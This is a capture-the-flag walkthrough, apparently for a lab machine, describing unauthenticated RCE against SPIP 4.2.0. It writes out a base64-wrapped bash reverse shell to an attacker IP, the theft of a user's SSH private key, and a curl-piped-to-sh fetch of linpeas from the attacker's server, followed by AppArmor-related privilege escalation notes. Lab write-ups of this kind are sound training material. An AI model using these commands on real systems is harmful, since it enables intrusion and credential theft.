The website seems to be a magazine about SPIP, which is a content management system:<br />

Directory enumeration gives some results:<br />

Moving to /spip, wappalyzer shows us that the server is running SPIP 4.2.0.<br />

Searching online I found that this version is vulnerable to unauthenticated RCE. The code for the exploit can be found in `exploit.py` of this folder. To run it, first base64 encode the following string `sh -i >& /dev/tcp/10.11.85.53/4444 0>&1`. The payload should look something like `echo base64string | base64 -d | bash`.<br />
So set up a netcat listener and run the following:<br />

The `think` user has a .ssh folder from which we can copy the private key. <br />

So, create an `id_rsa` file containing the private key, change it's permissions so that it can be used to access the machine with `chmod 600 id_rsa`. Finally log in with `ssh -i id_rsa think@target_IP`.<br />

Very good, now let's see if we can get root aswell. 
The target machine doesn't have Internet access. However I transfered linpeas from my machine to the target using curl. On the attackbox where linpeas is located, run `python3 -m http.server 80`, on the target run `curl http://machine_IP/linpeas.sh | sh`. <br />

The very first thing I see is that app armor is being used to harden the system. This is why I had some troubles running the reverse shell before. This user is not able to write files anywhere or access specific folders that are usually accessible without app armor. <br />
The `think` user has /usr/sbin/ash as shell, which we can see is restricted by apparmor. For example when I tried to tranfer linpeas inside /tmp, it didn't work and this is why. <br />
The configuration of apparmor for the "ash" shell is the following:<br />
